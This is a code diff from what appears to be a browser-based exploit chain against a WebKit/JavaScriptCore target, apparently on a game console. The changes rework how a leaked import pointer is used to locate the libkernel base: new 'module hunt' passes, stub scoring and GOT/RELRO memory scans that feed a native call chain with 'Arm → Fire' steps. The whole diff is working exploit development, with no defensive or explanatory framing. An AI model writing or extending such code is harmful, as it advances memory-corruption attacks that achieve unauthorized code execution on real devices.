@@ -47,13 +47,13 @@ import {
     verifyLibkernelBase,
     extPtrToLkCandidates,
     plausibleHeapCell,
-    resolveExtPtrVerifyBounded,
+    resolveExtModuleHunt,
 } from "./libkernel_resolve.js";
 import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831u";
+const BUILD_ID = "rw-20250831v";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -2013,7 +2013,8 @@ function runVerifyLk() {
         return;
     }
 
-    const passNames = ["error8", "page2", "walk16"];
+    const passNames = ["mod96", "mod192", "mod256"];
+    const passPages = [96, 192, 256];
     const pass = extResolveIdx % passNames.length;
     const isAlignedBase = (ptr.low & 0x3fff) === 0;
 
@@ -2037,34 +2038,35 @@ function runVerifyLk() {
             return;
         }
     } else {
-        mark("LK-EXT-FN", hex + " import ptr — pass=" + passNames[pass]);
+        mark("LK-EXT-FN", hex + " import — mod-hunt " + passNames[pass] + " (no k__error)");
     }
 
-    const resolved = resolveExtPtrVerifyBounded(p, ptr, off, webkitBase, pass);
+    const resolved = resolveExtModuleHunt(p, ptr, webkitBase, off, passPages[pass]);
     if (resolved) {
         saveLibkernelSession(resolved.lk, resolved.iatRva);
         if (addrIn) addrIn.value = String(resolved.lk);
         const v = verifyLibkernelBase(p, resolved.lk, off, { fnPtr: ptr, webkitBase, off });
         const kLog = resolved.k__error != null ? " k=0x" + resolved.k__error.toString(16) : "";
+        const stubLog = resolved.stubs != null ? " stubs=" + resolved.stubs : "";
         if (v.ok && v.strong) {
-            mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + kLog + " build=" + BUILD_ID);
+            mark("LK-VERIFY-OK", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " build=" + BUILD_ID);
             state("lk verified — Arm → Fire", "ok");
         } else if (v.ok) {
-            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + " — " + (v.warn || "weak"));
+            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " — " + (v.warn || "weak"));
             state("weak lk — Force lk → Arm → Fire", "warn");
         } else {
-            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + " — prologue only");
+            mark("LK-VERIFY-WARN", String(resolved.lk) + " via " + resolved.via + kLog + stubLog + " — stub hunt");
             state("weak lk — Force lk → Arm → Fire", "warn");
         }
-        mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + kLog);
+        mark("LK-RESOLVE-OK", hex + " → " + resolved.lk + " via " + resolved.via + kLog + stubLog);
         renderOut();
         crashLog.append("VERIFY OK " + hex + " → " + resolved.lk, "LK-VERIFY");
         crashLog.flushSync();
         return;
     }
 
-    const pageK = (ptr.low >>> 0) & 0x3fff;
-    mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass] + " page+k=0x" + pageK.toString(16));
+    mark("LK-RESOLVE-MISS", hex + " pass=" + passNames[pass]
+        + " — vtable ext may not be libkernel on poops");
     cycleExtPtrInHex();
     state("verify miss — tap again (cycles ptr + pass)", "bad");
     renderOut();
@@ -2178,7 +2180,7 @@ function finishFindLkChunk(chunk) {
             crashLog.flushSync();
 
             if (addrIn && hexes[0]) addrIn.value = hexes[0];
-            mark("LK-HINT", "Verify lk — ext fn ptrs (3 passes: error8/page2/walk16)");
+            mark("LK-HINT", "Scan GOT lite hunts stubs (no dump/k__error) — or Verify lk");
             mark("LK-MISS", "ext saved — zero finish reads build=" + BUILD_ID);
         } else if (chunk.cells === 0) {
             mark("LK-HINT", "no cells — re-run Start");
@@ -2234,7 +2236,7 @@ async function runFindLkAuto(preset) {
         knownExtPtrs: [],
     }, findLkPreset);
     let loops = 0;
-    const loopMax = 120;
+    const loopMax = findLkPreset.lite ? 200 : 120;
 
     try {
         while (findLkAuto && !findLkStop && loops < loopMax) {
@@ -2257,11 +2259,22 @@ async function runFindLkAuto(preset) {
             else if (chunk.phase === "vt-miss" && chunk.cellDbg && chunk.cellDbg.length)
                 mark("LK-CELL-DBG", chunk.cellDbg.join(" | ").slice(0, 240));
             else if (chunk.phase === "vt-done")
-                mark("LK-GOT", "vtable done ext=" + (chunk.ext || 0)
-                    + " cells=" + (chunk.cells != null ? chunk.cells : "?")
-                    + " n=" + (chunk.vtCount != null ? chunk.vtCount : "?")
-                    + (chunk.error ? " err=" + chunk.error : "")
-                    + " — abs RELRO");
+                mark("LK-GOT", "vtable ext=" + (chunk.ext || 0) + " — elf-ext stub hunt");
+            else if (chunk.phase === "elf-ext-start")
+                mark("LK-ELF-EXT", "mod hunt n=" + chunk.total + " (SCE/stub score, no k__error)");
+            else if (chunk.phase === "elf-ext")
+                state("Scan GOT elf-ext " + (chunk.idx || 0) + "/" + (chunk.total || "?")
+                    + " tried=" + (chunk.tried || 0), "warn");
+            else if (chunk.phase === "elf-ext-hit" || chunk.phase === "elf-ext-best")
+                mark("LK-ELF-EXT-OK", (chunk.source || chunk.phase)
+                    + " stubs=" + (chunk.stubs != null ? chunk.stubs : "?"));
+            else if (chunk.phase === "elf-ext-done")
+                mark("LK-GOT", "elf-ext miss — poops RELRO hunt");
+            else if (chunk.phase === "relro-poops-start")
+                mark("LK-RELRO", chunk.span || "poops RELRO");
+            else if (chunk.phase === "relro-poops" || chunk.phase === "relro-poops-region")
+                state("Scan GOT relro +0x" + (chunk.cursor != null ? chunk.cursor.toString(16) : "?")
+                    + " tried=" + (chunk.tried || 0), "warn");
             else if (chunk.phase === "abs-start")
                 mark("LK-GOT", "abs RELRO " + chunk.from + "…" + chunk.to);
             else if (chunk.phase === "abs-done")
